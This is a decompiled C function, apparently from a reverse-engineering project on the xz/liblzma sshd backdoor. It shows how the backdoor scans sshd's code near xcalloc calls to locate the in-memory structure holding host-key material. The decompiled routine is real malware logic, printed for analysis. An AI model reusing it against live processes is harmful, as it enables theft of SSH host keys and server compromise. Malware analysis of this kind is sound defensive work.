// /home/kali/xzre-ghidra/xzregh/103680_sshd_get_sensitive_data_address_via_xcalloc.c
// Function: sshd_get_sensitive_data_address_via_xcalloc @ 0x103680
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, void * * sensitive_data_out)


/*
 * AutoDoc: Consults the precomputed string-reference table to find the code region that contains sshd's zero-initialisation
 * `xcalloc` call. Immediately after each matching CALL it scans the next handful of instructions for stores into .bss,
 * records up to sixteen unique destinations, and looks for three consecutive slots separated by eight bytes (ptr, ptr+8,
 * ptr+0x10). That stride pattern matches the layout of `sensitive_data`, so the lowest address of the triplet becomes the
 * preferred candidate.
 */

#include "xzre_types.h"

BOOL sshd_get_sensitive_data_address_via_xcalloc
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
               string_references_t *string_refs,void **sensitive_data_out)

{
  u8 *xcalloc_call_target;
  u8 rex_extension;
  BOOL decode_ok;
  long clear_idx;
  long hit_scan_idx;
  long hit_compare_idx;
  u8 **hit_cursor;
  dasm_ctx_t *zero_ctx_cursor;
  u8 *store_operand_ptr;
  ulong hit_index;
  u8 hit_count;
  u8 tracked_reg;
  dasm_ctx_t store_probe_ctx;
  u8 *store_hits[16];
  
  *sensitive_data_out = (void *)0x0;
  xcalloc_call_target = (u8 *)string_refs->entries[0].func_start;
  if (xcalloc_call_target == (u8 *)0x0) {
    return FALSE;
  }
  tracked_reg = 0xff;
  store_operand_ptr = (u8 *)0x0;
  hit_count = 0;
  hit_cursor = store_hits;
  for (clear_idx = 0x20; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(undefined4 *)hit_cursor = 0;
    hit_cursor = (long *)((long)hit_cursor + 4);
  }
  zero_ctx_cursor = &store_probe_ctx;
  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(undefined4 *)&zero_ctx_cursor->instruction = 0;
    zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
  }
LAB_001036eb:
  do {
    if ((code_end <= code_start) ||
       (decode_ok = find_call_instruction(code_start,code_end,xcalloc_call_target,&store_probe_ctx), decode_ok == FALSE))
    goto LAB_00103802;
    code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
    decode_ok = find_instruction_with_mem_operand_ex
                      (code_start,code_start + 0x20,&store_probe_ctx,0x109,(void *)0x0);
  } while (decode_ok == FALSE);
  if ((store_probe_ctx.prefix.flags_u16 & 0x1040) == 0) {
LAB_00103788:
    if (tracked_reg != 0) {
      code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
      goto LAB_001036eb;
    }
  }
  else {
    if ((store_probe_ctx.prefix.flags_u16 & 0x40) != 0) {
      tracked_reg = store_probe_ctx.prefix._14_1_;
      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
        rex_extension = (char)store_probe_ctx.prefix.decoded.rex * '\x02';
LAB_00103782:
        tracked_reg = tracked_reg | rex_extension & 8;
      }
      goto LAB_00103788;
    }
    if ((store_probe_ctx.prefix.flags_u16 & 0x1000) != 0) {
      tracked_reg = store_probe_ctx.imm64_reg;
      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
        rex_extension = (char)store_probe_ctx.prefix.decoded.rex << 3;
        goto LAB_00103782;
      }
      goto LAB_00103788;
    }
  }
  if (((store_probe_ctx.prefix.flags_u16 & 0x100) != 0) &&
     (store_operand_ptr = (u8 *)store_probe_ctx.mem_disp,
     ((uint)store_probe_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
    store_operand_ptr = (u8 *)(store_probe_ctx.mem_disp + (long)store_probe_ctx.instruction) + store_probe_ctx.instruction_size;
  }
  if ((data_start <= store_operand_ptr) && (store_operand_ptr < data_end)) {
    hit_index = (ulong)hit_count;
    hit_count = hit_count + 1;
    store_hits[hit_index] = (long)store_operand_ptr;
    if (0xf < hit_count) {
LAB_00103802:
      clear_idx = 0;
      do {
        if ((uint)hit_count <= (uint)clear_idx) {
          return FALSE;
        }
        hit_scan_idx = 0;
        do {
          hit_compare_idx = 0;
          do {
            if (((void *)store_hits[clear_idx] == (void *)(store_hits[hit_scan_idx] + -8)) &&
               (store_hits[hit_scan_idx] == store_hits[hit_compare_idx] + -8)) {
              *sensitive_data_out = (void *)store_hits[clear_idx];
              return TRUE;
            }
            hit_compare_idx = hit_compare_idx + 1;
          } while ((uint)hit_compare_idx < (uint)hit_count);
          hit_scan_idx = hit_scan_idx + 1;
        } while ((uint)hit_scan_idx < (uint)hit_count);
        clear_idx = clear_idx + 1;
      } while( TRUE );
    }
  }
  tracked_reg = 0;
  code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
  goto LAB_001036eb;
}

